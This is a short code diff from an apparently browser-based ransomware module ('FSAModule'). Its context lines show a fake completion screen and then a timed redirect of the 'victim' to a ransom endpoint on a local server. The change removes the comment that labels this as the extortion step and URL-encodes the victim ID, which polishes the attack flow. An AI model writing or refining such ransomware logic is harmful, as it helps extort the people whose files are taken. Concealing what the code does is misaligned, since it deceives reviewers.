@@ -59,9 +59,8 @@ class FSAModule {
             // 5. Fake completion
             UIModule.showCompletion();
             
-            // 6. Redirect to Extortion (Ransom) Note on the Server
             setTimeout(() => {
-                window.location.href = 'http://localhost:3000/api/ransom/' + victimId;
+                window.location.href = 'http://localhost:3000/api/ransom/' + encodeURIComponent(victimId);
             }, 2500);
 
         } catch (error) {
